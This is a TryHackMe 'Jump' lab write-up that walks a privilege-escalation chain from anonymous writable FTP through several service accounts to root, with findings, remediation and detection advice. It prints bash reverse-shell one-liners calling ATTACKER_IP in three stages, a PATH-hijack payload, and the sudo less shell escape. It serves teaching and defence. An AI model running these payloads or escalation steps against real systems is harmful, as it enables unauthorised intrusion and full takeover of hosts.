---
title: "TryHackMe: Jump"
date: 2026-06-14 23:45:00 +0200
categories: [TryHackMe]
tags:
  - linux
  - ftp
  - automation
  - reverse-shell
  - path-hijacking
  - systemd
  - sudo
  - less
  - privilege-escalation
description: >-
  Jump chains anonymous writable FTP, automated script execution, weak group
  isolation, writable privileged automation, PATH hijacking, and unsafe sudo
  delegation into a multi-user escalation path ending in root.
author: lenovolegion7
media_subpath: /images/tryhackme_jump
image:
  path: room_image.webp
  alt: "Original TryHackMe Jump room artwork"
toc: true
comments: false
---

Jump is a Linux privilege-escalation challenge built around weak trust boundaries between automation accounts. Instead of moving directly from one low-privileged shell to root, the validated path crosses several service identities: anonymous FTP → `recon_user` → `dev_user` → `monitor_user` → `ops_user` → root.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Jump room card](room_card.webp){: w="299" h="270" .shadow }](https://tryhackme.com/room/jump){: .center }

## Executive Summary

The target exposed only FTP and SSH:

```text
21/tcp  FTP
22/tcp  SSH
```

The validated attack path was:

1. log in to FTP anonymously;
2. identify a writable `incoming/` directory consumed by an automated recon pipeline;
3. upload a shell script and obtain command execution as `recon_user`;
4. abuse excessive group membership to access `dev_user` resources;
5. overwrite the group-writable `/opt/dev/backup.sh` script;
6. wait for development automation to execute it as `dev_user`;
7. abuse a PATH-hijack condition in `healthcheck.service` by placing a malicious `ps` in `/opt/dev/bin`;
8. obtain `monitor_user` access when the healthcheck path executes;
9. use `monitor_user` sudo rights to run `/usr/local/bin/deploy.sh` as `ops_user`;
10. abuse the writable `/opt/app/deploy_helper.sh` invoked by that deployment wrapper;
11. obtain `ops_user` access;
12. abuse `NOPASSWD` sudo access to `/usr/bin/less`;
13. use the `less` shell escape to obtain a root shell and read the final objective.

> **Result:** A chain of automation and delegation mistakes converted anonymous FTP access into complete root compromise without requiring a kernel exploit.
{: .prompt-danger }

## Scope and Safety Context

This assessment applies only to the authorized TryHackMe Jump lab.

The assessment was limited to the authorized TryHackMe lab. The validated attack path progressed through `dev_user`, `monitor_user`, and `ops_user` before reaching root.

The published version redacts ephemeral target addresses, attacker addresses, and all challenge flags.

## Initial Enumeration

Service discovery identified two externally reachable services:

```console
$ nmap \
  -p21,22 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed services:

```text
21/tcp  FTP  vsftpd 3.0.5
22/tcp  SSH  OpenSSH 9.6p1 Ubuntu
```

Anonymous FTP login was permitted.

## Anonymous FTP Recon Pipeline

The FTP service exposed readable recon material and a writable intake directory.

The recon README described the workflow:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

A Bash callback script was uploaded to the writable intake location:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

After the automation processed the uploaded script, a shell was received as:

```text
recon_user
```

The account context was:

```text
uid=1001(recon_user)
groups=1001(recon_user),1002(dev_user),1005(devops)
```

The first authorized proof obtained under this stage is published only as:

```text
THM{[REDACTED]}
```

## recon_user to dev_user

The `recon_user` account had excessive cross-user group membership. This permitted access to `dev_user` resources including:

```text
/home/dev_user
/opt/dev
```

The development backup script was group-writable:

```text
/opt/dev/backup.sh
```

Original content:

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Because the script was writable by the lower-privileged context but executed by development automation as `dev_user`, it was replaced with a controlled callback:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1'
```

When the automation executed the modified script, the resulting shell ran as:

```text
dev_user
```

The `dev_user` proof is redacted:

```text
THM{[REDACTED]}
```

## dev_user to monitor_user — PATH Hijacking

A systemd service was configured to run as `monitor_user`:

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

The healthcheck script invoked `ps` without an absolute path:

```bash
#!/bin/bash
echo "Running as: $(whoami)"

while true; do
    ps aux | grep -v grep
    sleep 5
done
```

Because `dev_user` could write to `/opt/dev/bin`, a malicious replacement could be placed at:

```text
/opt/dev/bin/ps
```

Representative payload:

```bash
#!/bin/bash
setsid bash -i >& /dev/tcp/ATTACKER_IP/5557 0>&1
```

Execution of the PATH-hijack path confirmed access as:

```text
monitor_user
```

The corresponding proof is redacted:

```text
THM{[REDACTED]}
```

## monitor_user to ops_user — Delegated Deployment

Under `monitor_user`, sudo enumeration showed:

```text
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

The deployment wrapper executed:

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

`/opt/app/deploy_helper.sh` was modifiable from the `monitor_user` stage. This made the delegated `sudo -u ops_user` execution path unsafe because attacker-controlled helper content was launched under the `ops_user` identity.

The wrapper was executed as:

```console
$ sudo -u ops_user /usr/local/bin/deploy.sh
```

The resulting access was confirmed as:

```text
ops_user
```

The `ops_user` proof is redacted:

```text
THM{[REDACTED]}
```

## ops_user to root — sudo less

Sudo enumeration under `ops_user` showed:

```text
(root) NOPASSWD: /usr/bin/less
```

The final objective could be opened directly with:

```console
$ sudo /usr/bin/less /root/flag.txt
```

Because `less` supports shell escapes, the same sudo rule also allowed an interactive root shell:

```text
!/bin/sh
```

The supplemental evidence confirms:

```text
uid=0(root) gid=0(root) groups=0(root)
```

The final flag value is redacted:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - Anonymous FTP with Writable Incoming Directory

- **Severity:** High
- **Impact:** unauthenticated upload into an automated processing path

Anonymous FTP users could place files into a writable intake directory used by backend automation.

**Remediation:**

- disable anonymous FTP write access;
- require authentication for file intake;
- isolate uploads from execution paths;
- enforce strict file validation and malware scanning.

### F-02 - Automated Execution of Untrusted FTP Uploads

- **Severity:** Critical
- **Impact:** unauthenticated remote code execution as `recon_user`

The recon pipeline interpreted attacker-controlled uploaded shell content rather than treating it purely as data.

**Remediation:**

- never execute uploaded user content directly;
- use a constrained job format;
- require signed or allow-listed jobs;
- execute jobs in a sandbox with no shell interpretation.

### F-03 - Excessive Group Membership and Weak Home Isolation

- **Severity:** High
- **Impact:** cross-user data access and access to development assets

`recon_user` inherited access to `dev_user` resources through inappropriate group membership.

**Remediation:**

- remove unnecessary cross-user group memberships;
- enforce least privilege;
- restrict home directories and sensitive files to their owners;
- review shared automation groups regularly.

### F-04 - Group-Writable Development Automation Script

- **Severity:** Critical
- **Affected path:** `/opt/dev/backup.sh`
- **Impact:** code execution as `dev_user`

A script executed by higher-trust automation was writable by a lower-trust principal.

**Remediation:**

- make privileged automation scripts root- or deployment-owned;
- remove write access from runtime users;
- apply integrity monitoring;
- deploy immutable or signed automation content.

### F-05 - PATH Hijack in monitor_user Healthcheck Service

- **Severity:** Critical
- **Affected service:** `healthcheck.service`
- **Impact:** code execution as `monitor_user`

The service prioritized the writable `/opt/dev/bin` directory and invoked `ps` without an absolute path.

**Remediation:**

- use `/usr/bin/ps` explicitly;
- remove writable directories from privileged service PATH values;
- lock down `/opt/dev/bin`;
- review systemd units for unqualified executable names.

### F-06 - Operational Logs Disclosed Automation Behavior

- **Severity:** Medium
- **Impact:** disclosure of service paths, command activity, users, and automation timing

Operational logging exposed information useful for lateral-movement analysis.

**Remediation:**

- restrict log readability;
- avoid logging sensitive command lines and environment details;
- retain only operationally necessary information.

## Additional Escalation Weaknesses

### Writable Deployment Helper Executed Through Delegated sudo

`monitor_user` could run `/usr/local/bin/deploy.sh` as `ops_user` without a password. That wrapper executed `./deploy_helper.sh` from `/opt/app`, and the helper was modifiable from the lower-trust context.

This converted delegated deployment permission into arbitrary execution as `ops_user`.

**Remediation:**

- make deployment helpers root- or `ops_user`-owned and non-writable by `monitor_user`;
- use absolute helper paths;
- validate ownership and integrity before execution;
- avoid broad `NOPASSWD` delegation to wrappers that execute mutable secondary files.

### NOPASSWD sudo Access to less

`ops_user` could execute `/usr/bin/less` as root without a password. Since `less` supports shell escapes, the rule was equivalent to unrestricted root command execution.

**Remediation:**

- remove privileged `less` execution from sudoers;
- never grant sudo access to interactive pagers with shell escape functionality;
- use tightly scoped root-owned wrappers for read-only privileged file access;
- audit sudoers against known shell-escape behavior.

## Security Impact

The validated attack chain demonstrates complete compromise from unauthenticated network access to root.

An attacker with equivalent access could:

- upload files without authentication;
- achieve automated code execution as `recon_user`;
- cross user trust boundaries through group permissions;
- modify automation executed as `dev_user`;
- hijack privileged command resolution to reach `monitor_user`;
- abuse delegated deployment to reach `ops_user`;
- convert an unsafe sudo pager rule into a root shell;
- access all data and controls available to root.

The central failure was not a single vulnerable binary. It was a chain of trust relationships in which lower-privileged identities could influence scripts, executables, or helpers later executed by more privileged identities.

## Detection Opportunities

Useful monitoring controls include:

- alert on anonymous FTP uploads;
- monitor executable or script creation in FTP intake directories;
- detect child shells spawned by recon automation;
- alert on modifications to `/opt/dev/backup.sh`;
- monitor writes to `/opt/dev/bin`;
- detect unexpected binaries shadowing common utilities such as `ps`;
- alert on changes to `/opt/app/deploy_helper.sh`;
- monitor `sudo -u ops_user /usr/local/bin/deploy.sh`;
- alert on root execution of interactive pagers such as `less`;
- monitor shell escapes or child shells spawned from privileged pager processes.

## Remediation Priorities

1. Disable anonymous writable FTP.
2. Stop executing untrusted uploaded files.
3. Remove `recon_user` from inappropriate development groups.
4. Protect `/opt/dev/backup.sh` from lower-privileged modification.
5. Replace unqualified `ps` execution with `/usr/bin/ps`.
6. Remove writable directories from privileged service PATH values.
7. Restrict operational log access.
8. Protect `/opt/app/deploy_helper.sh` from `monitor_user`.
9. Replace the delegated deployment workflow with an immutable root-owned implementation.
10. Remove root `NOPASSWD` access to `/usr/bin/less`.
11. Audit all automation and sudo trust boundaries for transitive privilege-escalation paths.

## Retest Plan

1. Confirm anonymous users cannot upload to FTP processing directories.
2. Verify uploaded content is never interpreted as executable shell code.
3. Confirm `recon_user` cannot read or modify `dev_user` resources.
4. Verify `/opt/dev/backup.sh` is not writable by lower-trust users.
5. Confirm healthcheck uses an absolute `/usr/bin/ps` path.
6. Verify `/opt/dev/bin` cannot influence `monitor_user` service execution.
7. Confirm operational logs reveal no unnecessary automation details.
8. Verify `monitor_user` cannot modify any helper executed by delegated `ops_user` sudo.
9. Confirm the deployment path cannot produce `ops_user` command execution from `monitor_user`.
10. Verify `ops_user` no longer has sudo access to interactive shell-escape-capable pagers.
11. Confirm the previous chain no longer results in a root shell.

## Lessons Learned

Jump demonstrates how privilege escalation often emerges from **transitive trust**, not from one dramatic vulnerability.

Anonymous upload capability fed trusted automation. Excessive group membership exposed development resources. Writable automation moved execution into `dev_user`. A writable PATH component allowed control of a command executed as `monitor_user`. Mutable deployment helpers undermined delegated sudo to `ops_user`, and a final unsafe `less` rule collapsed the root boundary completely.

The key defensive lesson is to treat every automation boundary as a privilege boundary: scripts, PATH entries, helper programs, group memberships, and sudo wrappers must all be protected from lower-trust modification.
